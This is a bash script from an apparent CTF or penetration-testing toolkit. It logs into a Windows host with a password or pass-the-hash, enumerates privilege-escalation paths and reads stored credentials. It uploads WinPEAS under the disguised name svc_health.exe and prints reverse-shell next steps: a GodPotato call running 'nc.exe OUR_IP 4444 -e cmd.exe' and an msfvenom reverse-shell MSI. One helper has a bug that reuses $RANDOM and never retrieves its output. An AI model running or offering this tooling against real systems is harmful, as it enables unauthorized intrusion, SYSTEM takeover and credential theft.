#!/usr/bin/env bash
# windows-privesc.sh — Windows privilege escalation surface check
#
# Connects to a Windows target via Evil-WinRM or wmiexec, runs LOTL privesc
# checks, optionally stages and runs WinPEAS. Outputs ranked findings.
#
# Usage:
#   windows-privesc.sh --target 10.10.10.10 --user USER --pass PASS
#   windows-privesc.sh --target 10.10.10.10 --user USER --hash NTLM_HASH
#   windows-privesc.sh --target 10.10.10.10 --user USER --pass PASS --winpeas
#   windows-privesc.sh --target 10.10.10.10 --user USER --pass PASS --domain corp.local

set -euo pipefail

CTF_ROOT="${CTF_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
ARTIFACTS="$CTF_ROOT/artifacts/windows"
TOOLS_WIN="$CTF_ROOT/tools/windows"
WINPEAS_URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"

TARGET=""
USER=""
PASS=""
HASH=""
DOMAIN="."
RUN_WINPEAS=false

while [[ $# -gt 0 ]]; do
  case "$1" in
    --target|-t)  TARGET="$2"; shift 2 ;;
    --user|-u)    USER="$2";   shift 2 ;;
    --pass|-p)    PASS="$2";   shift 2 ;;
    --hash)       HASH="$2";   shift 2 ;;
    --domain|-d)  DOMAIN="$2"; shift 2 ;;
    --winpeas)    RUN_WINPEAS=true; shift ;;
    -h|--help) grep '^#' "$0" | head -15 | sed 's/^# \?//'; exit 0 ;;
    *) echo "[!] Unknown flag: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[!] --target required"; exit 1; }
[[ -z "$USER"   ]] && { echo "[!] --user required"; exit 1; }
[[ -z "$PASS" && -z "$HASH" ]] && { echo "[!] --pass or --hash required"; exit 1; }

OUT="$ARTIFACTS/$TARGET/privesc"
mkdir -p "$OUT" "$TOOLS_WIN"
LOG="$OUT/privesc.log"
TS=$(date +%Y%m%d_%H%M%S)

ts()   { date +%H:%M:%S; }
log()  { echo "[$(ts)] $*" | tee -a "$LOG"; }
ok()   { echo "[$(ts)] [+] $*" | tee -a "$LOG"; }
warn() { echo "[$(ts)] [!] $*" | tee -a "$LOG"; }
crit() { echo "[$(ts)] [CRITICAL] $*" | tee -a "$LOG"; }
hr()   { echo "────────────────────────────────────────" | tee -a "$LOG"; }

log "Target: $TARGET | User: $USER | Domain: $DOMAIN"

# ── Build remote execution command ───────────────────────────────────────────
# Returns output from a command run on the Windows target
run_cmd() {
  local cmd="$1"
  if [[ -n "$PASS" ]]; then
    impacket-wmiexec -nooutput "$DOMAIN/$USER:$PASS@$TARGET" "$cmd" 2>/dev/null || true
  else
    impacket-wmiexec -nooutput -hashes ":$HASH" "$DOMAIN/$USER@$TARGET" "$cmd" 2>/dev/null || true
  fi
}

run_cmd_out() {
  local cmd="$1" tmpfile
  tmpfile="C:\\Windows\\Temp\\.pe_tmp_$RANDOM.txt"
  if [[ -n "$PASS" ]]; then
    impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET" \
      "cmd /c ($cmd) > $tmpfile 2>&1" 2>/dev/null || true
    # Retrieve via SMB
    if [[ -n "$PASS" ]]; then
      smbclient "//$TARGET/C$" -U "$DOMAIN/$USER%$PASS" \
        -c "get Windows\\Temp\\.pe_tmp_$RANDOM.txt /tmp/pe_out.txt" 2>/dev/null || true
    fi
  fi
  # Fallback: run inline and capture
  if command -v evil-winrm &>/dev/null && [[ -n "$PASS" ]]; then
    evil-winrm -i "$TARGET" -u "$USER" -p "$PASS" \
      -e "/dev/null" -s "/dev/null" \
      -c "$cmd" 2>/dev/null | tail -n +3 || true
  fi
}

# Quick exec via wmiexec — returns stdout
exec_win() {
  local cmd="$1"
  local outfile="/tmp/win_pe_$$_$RANDOM.txt"
  if [[ -n "$PASS" ]]; then
    impacket-wmiexec "$DOMAIN/$USER:$PASS@$TARGET" \
      "cmd /c $cmd" 2>&1 | grep -v "^Impacket\|^\[\*\]\|^$" || true
  else
    impacket-wmiexec -hashes ":$HASH" "$DOMAIN/$USER@$TARGET" \
      "cmd /c $cmd" 2>&1 | grep -v "^Impacket\|^\[\*\]\|^$" || true
  fi
}

# ── Test connectivity ─────────────────────────────────────────────────────────
hr
log "Testing connectivity..."
whoami_result=$(exec_win "whoami /all" 2>/dev/null | head -5 || echo "CONNECT_FAILED")
if [[ "$whoami_result" == "CONNECT_FAILED" || -z "$whoami_result" ]]; then
  warn "wmiexec failed — trying crackmapexec check..."
  if [[ -n "$PASS" ]]; then
    crackmapexec smb "$TARGET" -u "$USER" -p "$PASS" 2>/dev/null | tee -a "$LOG" || true
  fi
  warn "If connection failed, check credentials and target availability."
  warn "Continuing with checks that don't require connectivity..."
fi

# ── LOTL Checks ───────────────────────────────────────────────────────────────
hr
log "Running LOTL privilege escalation checks..."

FINDINGS=()

# 1. Privileges
log "Check 1: Token privileges..."
priv_output=$(exec_win "whoami /priv" 2>/dev/null || echo "")
echo "$priv_output" > "$OUT/whoami_priv_$TS.txt"

if echo "$priv_output" | grep -qi "SeImpersonatePrivilege"; then
  crit "SeImpersonatePrivilege ENABLED → GodPotato/PrintSpoofer → SYSTEM"
  FINDINGS+=("CRITICAL: SeImpersonatePrivilege → use GodPotato or PrintSpoofer")
fi
if echo "$priv_output" | grep -qi "SeDebugPrivilege"; then
  crit "SeDebugPrivilege ENABLED → LSASS dump possible"
  FINDINGS+=("CRITICAL: SeDebugPrivilege → LSASS dump with procdump or comsvcs.dll")
fi
if echo "$priv_output" | grep -qi "SeBackupPrivilege"; then
  crit "SeBackupPrivilege ENABLED → read any file (SAM/NTDS)"
  FINDINGS+=("CRITICAL: SeBackupPrivilege → robocopy/wbadmin → SAM+NTDS dump")
fi
if echo "$priv_output" | grep -qi "SeRestorePrivilege"; then
  warn "SeRestorePrivilege ENABLED → write any file"
  FINDINGS+=("HIGH: SeRestorePrivilege → write system files")
fi
if echo "$priv_output" | grep -qi "SeLoadDriverPrivilege"; then
  warn "SeLoadDriverPrivilege ENABLED → load malicious kernel driver"
  FINDINGS+=("HIGH: SeLoadDriverPrivilege → Capcom.sys / other driver exploit")
fi

# 2. AlwaysInstallElevated
log "Check 2: AlwaysInstallElevated..."
aie_hkcu=$(exec_win 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul' || echo "")
aie_hklm=$(exec_win 'reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul' || echo "")
echo "$aie_hkcu $aie_hklm" > "$OUT/alwaysinstallelevated_$TS.txt"
if echo "$aie_hkcu $aie_hklm" | grep -q "0x1"; then
  crit "AlwaysInstallElevated is set! → msfvenom MSI payload → SYSTEM"
  FINDINGS+=("CRITICAL: AlwaysInstallElevated → msfvenom -f msi → msiexec /quiet")
fi

# 3. Unquoted service paths
log "Check 3: Unquoted service paths..."
unquoted=$(exec_win 'wmic service get name,displayname,pathname,startmode' 2>/dev/null | \
  grep -i "auto" | grep -iv 'C:\\Windows\\' | grep -v '"' || echo "")
echo "$unquoted" > "$OUT/unquoted_services_$TS.txt"
if [[ -n "$unquoted" ]]; then
  warn "Potential unquoted service paths found:"
  echo "$unquoted" | head -10 | tee -a "$LOG"
  FINDINGS+=("HIGH: Unquoted service paths found — check icacls on path segments")
fi

# 4. Autorun registry
log "Check 4: Autorun registry entries..."
exec_win 'reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 2>/dev/null | \
  tee "$OUT/autorun_hklm_$TS.txt" | tee -a "$LOG" || true
exec_win 'reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 2>/dev/null | \
  tee "$OUT/autorun_hkcu_$TS.txt" | tee -a "$LOG" || true

# 5. AutoLogon credentials
log "Check 5: AutoLogon credentials..."
autologon=$(exec_win 'reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"' 2>/dev/null || echo "")
echo "$autologon" > "$OUT/autologon_$TS.txt"
if echo "$autologon" | grep -qi "DefaultPassword\|DefaultUserName"; then
  crit "AutoLogon credentials found in registry!"
  echo "$autologon" | grep -i "DefaultPassword\|DefaultUserName" | tee -a "$LOG"
  FINDINGS+=("CRITICAL: AutoLogon creds in registry — check DefaultUserName/DefaultPassword")
fi

# 6. Scheduled tasks
log "Check 6: Scheduled tasks..."
exec_win 'schtasks /query /fo LIST /v' 2>/dev/null | \
  grep -E "TaskName|Run As User|Task To Run|Status" | \
  tee "$OUT/schtasks_$TS.txt" | head -40 | tee -a "$LOG" || true

# 7. Services running as SYSTEM with non-system binary paths
log "Check 7: Services with non-Windows binary paths..."
exec_win 'sc query type= all state= all' 2>/dev/null | \
  tee "$OUT/sc_query_$TS.txt" | head -30 | tee -a "$LOG" || true

# 8. PowerShell history
log "Check 8: PowerShell command history..."
ps_hist=$(exec_win 'type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 2>nul' || echo "")
if [[ -n "$ps_hist" && "$ps_hist" != *"system cannot find"* ]]; then
  echo "$ps_hist" > "$OUT/ps_history_$TS.txt"
  ok "PowerShell history found:"
  echo "$ps_hist" | grep -i "pass\|cred\|secret\|key" | head -10 | tee -a "$LOG" || true
  FINDINGS+=("INFO: PowerShell history present — check for credentials")
fi

# 9. Interesting files
log "Check 9: Interesting credential files..."
interesting_locs=(
  'C:\Windows\Panther\Unattend.xml'
  'C:\Windows\Panther\unattended.xml'
  'C:\Windows\system32\sysprep\Unattend.xml'
  'C:\inetpub\wwwroot\web.config'
  'C:\xampp\htdocs\config.php'
  'C:\Users\Administrator\.ssh\id_rsa'
)
for loc in "${interesting_locs[@]}"; do
  result=$(exec_win "dir \"$loc\" 2>nul" || echo "")
  if [[ -n "$result" && "$result" != *"cannot find"* && "$result" != *"File Not Found"* ]]; then
    ok "Found: $loc"
    FINDINGS+=("INFO: $loc exists — may contain credentials")
  fi
done

# ── WinPEAS (optional) ────────────────────────────────────────────────────────
if $RUN_WINPEAS; then
  hr
  log "WinPEAS: staging and running..."

  WINPEAS_LOCAL="$TOOLS_WIN/winpeas.exe"
  if [[ ! -f "$WINPEAS_LOCAL" ]]; then
    log "Downloading WinPEAS..."
    curl -sL "$WINPEAS_URL" -o "$WINPEAS_LOCAL" 2>/dev/null || {
      warn "Download failed — place winpeas.exe at $WINPEAS_LOCAL manually"
    }
  fi

  if [[ -f "$WINPEAS_LOCAL" ]]; then
    WINPEAS_OUT="$OUT/winpeas_$TS.txt"
    log "Running WinPEAS via Evil-WinRM (output: $WINPEAS_OUT)..."

    if [[ -n "$PASS" ]]; then
      # Upload and execute via Evil-WinRM
      evil-winrm -i "$TARGET" -u "$USER" -p "$PASS" \
        -e "$TOOLS_WIN" 2>/dev/null <<EOF | tee "$WINPEAS_OUT" | grep -E "CRITICAL|HIGH|Interesting\|password\|Password" | head -50 | tee -a "$LOG" || true
upload winpeas.exe C:\\Windows\\Temp\\svc_health.exe
C:\\Windows\\Temp\\svc_health.exe
exit
EOF
    else
      warn "WinPEAS via Evil-WinRM requires --pass (not hash). Skipping upload."
    fi

    # Parse output for key findings
    if [[ -f "$WINPEAS_OUT" ]]; then
      ok "WinPEAS complete. Key findings:"
      grep -iE "CRITICAL|SeImpersonate|SeDebug|AlwaysInstall|unquoted|password.*:.*[^*]{3}|cpassword" \
        "$WINPEAS_OUT" 2>/dev/null | head -30 | tee -a "$LOG" || true
    fi
  fi
fi

# ── Summary ───────────────────────────────────────────────────────────────────
hr
log "=== PRIVESC FINDINGS SUMMARY ==="
if [[ ${#FINDINGS[@]} -eq 0 ]]; then
  warn "No critical findings detected by automated checks."
  warn "Try --winpeas for deeper analysis, or check manually."
else
  for finding in "${FINDINGS[@]}"; do
    echo "  → $finding" | tee -a "$LOG"
  done
fi

echo ""
echo "=== RECOMMENDED NEXT STEPS ==="
echo ""

# Print targeted next steps based on findings
for finding in "${FINDINGS[@]}"; do
  case "$finding" in
    *SeImpersonatePrivilege*)
      echo "  [SYSTEM PATH] SeImpersonatePrivilege:"
      echo "    1. Upload GodPotato-NET4.exe to C:\\Windows\\Temp\\"
      echo "    2. Run: .\\GodPotato-NET4.exe -cmd \"cmd /c whoami\""
      echo "    3. Get SYSTEM shell: .\\GodPotato-NET4.exe -cmd \"C:\\Temp\\nc.exe OUR_IP 4444 -e cmd.exe\""
      echo ""
      ;;
    *AlwaysInstallElevated*)
      echo "  [SYSTEM PATH] AlwaysInstallElevated:"
      echo "    msfvenom -p windows/x64/shell_reverse_tcp LHOST=OUR_IP LPORT=4444 -f msi -o evil.msi"
      echo "    msiexec /quiet /qn /i evil.msi"
      echo ""
      ;;
    *AutoLogon*)
      echo "  [CREDS FOUND] AutoLogon — read full value:"
      echo "    reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
      echo ""
      ;;
    *unquoted*)
      echo "  [PRIVESC PATH] Unquoted paths — check each with:"
      echo "    icacls \"C:\\path\\to\\dir\\\" (look for BUILTIN\\Users:(W))"
      echo ""
      ;;
  esac
done

echo "  Manual follow-up:"
echo "    evil-winrm -i $TARGET -u $USER ${PASS:+-p $PASS}${HASH:+-H $HASH}"
echo "    Read: ${CTF_ROOT:-.}/methods/windows/windows_pentest_playbook.md (Phase 4)"
echo ""
ok "Privesc check complete. Artifacts: $OUT"
